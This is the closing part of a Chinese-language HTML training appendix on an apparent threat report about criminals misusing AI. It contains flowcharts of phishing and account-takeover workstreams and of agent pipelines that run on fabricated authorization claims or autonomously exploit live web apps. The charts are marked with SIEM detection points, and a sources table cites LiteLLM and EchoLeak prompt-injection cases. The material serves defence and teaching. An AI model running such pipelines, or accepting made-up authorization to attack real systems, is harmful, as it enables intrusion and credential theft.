+        W3[&quot;W3 反詐防禦破解&quot;]
+        W4b[&quot;W4 竊得資料處理&quot;]
+    end
+    subgraph OP[&quot;網路行動 (W5-W10)&quot;]
+        W5b[&quot;W5 AI 廠商入侵&quot;]
+        W6[&quot;W6 遊戲釣魚/ATO&quot;]
+        W7[&quot;W7 Webmail/社群 ATO&quot;]
+        W8[&quot;W8 帳號農場&quot;]
+        W9[&quot;W9 Android 惡意程式/PII&quot;]
+        W10[&quot;W10 Web 利用&quot;]
+    end
+    W1 --&gt;|&quot;AITM kit / signed APK&quot;| W6
+    W1 --&gt; W9
+    W2 --&gt;|&quot;cloaked lure serving&quot;| W6
+    W3 --&gt;|&quot;forged captcha tokens&quot;| W6
+    W4b --&gt;|&quot;credential combo lists&quot;| W7
+    W5b --&gt;|&quot;stolen provider keys&quot;| W4b
+</pre>
+<h2 id="f3-fig-15-vs-fig-16">F.3 兩種自主度管線並置（Fig. 15 vs Fig. 16，偵測著力點標註）</h2>
+<pre class="mermaid">flowchart TB
+    subgraph F15[&quot;Fig.15 人類逐步指揮 (人在迴圈)&quot;]
+        S1[&quot;Scope: 手寫 scope + 捏造授權說辭&quot;] --&gt; S2[&quot;Dispatch: slash command 觸發平行代理&quot;]
+        S2 --&gt; S3[&quot;Probe&quot;] --&gt; S4[&quot;Verify&quot;] --&gt; S5[&quot;Report: 人類審查增量報告&quot;]
+        S5 -.-&gt;|&quot;Next target domain(人類決策)&quot;| S1
+    end
+    subgraph F16[&quot;Fig.16 全自主 (無人在迴圈)&quot;]
+        A1[&quot;Stage: 容器化平台+本地模型閘道&quot;] --&gt; A2[&quot;Aim: 對準 live web app&quot;]
+        A2 --&gt; A3[&quot;Exploit: 注入/XSS/authbypass/SSRF 對生產系統實利用&quot;] --&gt; A4[&quot;Harvest: 收集發現與憑證&quot;]
+        A4 -.-&gt;|&quot;No human in the loop&quot;| A2
+    end
+    S2 -.-&gt;|&quot;偵測著力: 發起點+scope檔存取+人類作息關聯&quot;| DET1[&quot;SIEM&quot;]
+    A3 -.-&gt;|&quot;偵測著力: 機器速度+均勻節律+跨晝夜+多類別(附錄D)&quot;| DET1
+</pre>
+<hr />
+<h2 id="websearch">本附錄新增之外部技術來源（第二階段 WebSearch 補查）</h2>
+<table>
+<thead>
+<tr>
+<th>主題</th>
+<th>來源</th>
+<th>性質</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2026-42208 利用機制/PoC/受影響版本</td>
+<td>Bishop Fox（揭露方）; docs.litellm.ai; Sysdig（野外 36 小時利用）; The Hacker News; SentinelOne; CSA Labs</td>
+<td>獨立技術查證</td>
+</tr>
+<tr>
+<td>lethal trifecta（致命三元組）</td>
+<td>Simon Willison（2025，獨立研究者提出）</td>
+<td>概念框架，獨立</td>
+</tr>
+<tr>
+<td>EchoLeak zero-click 竊金鑰</td>
+<td>CVE-2025-32711（M365 Copilot，CVSS 9.3）; Sysdig prompt-injection guide</td>
+<td>同型獨立先例</td>
+</tr>
+<tr>
+<td>模型權重安全分級</td>
+<td>RAND RRA2849-1《Securing AI Model Weights》(2024); RRA4704-1《Achieving SL3》(2026-08，262 控制/31 向量/NIST 800-53)</td>
+<td>獨立研究</td>
+</tr>
+<tr>
+<td>AiTM / evilginx 偵測（CT log、FIDO2/CAE）</td>
+<td>MITRE ATT&amp;CK S9003（evilginx2）; Deepwatch; Microsoft Sentinel KQL 實務</td>
+<td>獨立技術查證</td>
+</tr>
+<tr>
+<td>antidetect 指紋內部一致性、JA3/JA4、住宅代理</td>
+<td>2026 fingerprinting 研究彙整; 學術《Resident Evil》(IEEE S&amp;P 2019)</td>
+<td>獨立研究</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>紀律重申：以上 LiteLLM CVE、evilginx、antidetect 研究均為「<strong>與本案 TTP 同型的獨立技術佐證</strong>」，用以證明手法真實存在並提供防禦深度；報告原文對 LiteLLM 竊金鑰歸屬「多名行為者」、對 GTG-50020 明確點名「評測沙箱」注入——<strong>不因本附錄的技術深化而改變或擴大歸因</strong>（見第 12 節）。</p>
+</blockquote>
+<hr />
+<p><em>（本教材依《00-agent-brief.md》產出規格撰寫；全文繁體中文，技術名詞、公司名、IOC、英文引文保留原文；所有具體主張均可追溯至 PDF 頁碼或第 9 節所列 URL。）</em></p>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js"></script>
+<script>
+(function(){
+  var dark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+  if (window.mermaid) {
+    mermaid.initialize({startOnLoad:true, theme: dark ? 'dark' : 'default', securityLevel:'loose', flowchart:{useMaxWidth:true}});
+  }
+})();
+</script>
+</body></html>
